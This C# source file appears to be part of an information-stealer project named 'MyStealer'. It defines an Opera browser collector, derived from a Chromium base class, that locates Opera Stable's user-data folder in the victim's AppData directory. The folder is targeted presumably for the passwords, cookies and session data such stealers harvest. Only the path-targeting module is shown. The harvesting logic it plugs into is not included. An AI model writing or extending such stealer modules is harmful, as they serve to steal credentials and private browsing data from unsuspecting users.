using System.IO;
using System;

namespace MyStealer.Collectors.Browser.ChromiumBased
{
    internal class Opera : Chromium
    {
        public override string ApplicationName => "Opera";

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Opera Software", "Opera Stable");
    }
}
